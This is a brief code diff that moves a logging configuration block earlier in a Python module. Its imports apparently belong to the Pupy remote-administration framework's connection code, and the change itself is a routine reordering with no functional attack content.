@@ -51,6 +51,12 @@ except ImportError, e:
 import socket
 socket.setdefaulttimeout(60)
 
+import logging
+
+logging.basicConfig()
+logger = logging.getLogger('pp')
+logger.setLevel(logging.WARNING)
+
 import time
 from rpyc.core.service import Service, ModuleNamespace
 from rpyc.lib.compat import execute
@@ -67,12 +73,6 @@ from network import conf
 from network.lib.base_launcher import LauncherError
 from network.lib.connection import PupyConnection
 from network.lib.streams.PupySocketStream import PupyChannel
-
-import logging
-
-logging.basicConfig()
-logger = logging.getLogger('pp')
-logger.setLevel(logging.WARNING)
 
 import shlex
 import zlib
